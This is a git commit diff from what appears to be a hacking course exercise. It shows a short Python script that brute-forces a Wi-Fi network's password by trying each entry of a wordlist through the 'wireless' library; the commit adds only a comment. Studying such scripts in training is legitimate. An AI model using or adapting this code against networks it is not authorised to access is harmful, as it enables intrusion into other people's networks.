7889744415955128a618be69ddc06f014b1eb846
albert18 <erertech@gmail.com>
2022-12-20 16:49:51 +0300

    update

--- 4. Udemy/1. Python 3 Hacking/6. Passcracker/wireless.py
+++ 4. Udemy/1. Python 3 Hacking/6. Passcracker/wireless.py
@@ -3,7 +3,8 @@ from wireless import Wireless
 wire = Wireless()
 with open('passwordlist.txt', 'r') as file:
     for line in file.readlines():
-        if wire.connect(ssid='', password=line.strip()) == True:
+        # This will only work with wireless and not ethernet cable
+        if wire.connect(ssid='', password=line.strip()) == True: 
             print('[+] ' + line.strip() + ' - Successs!')
         else:
             print('[-] ' + line.strip() + ' - Failed!')
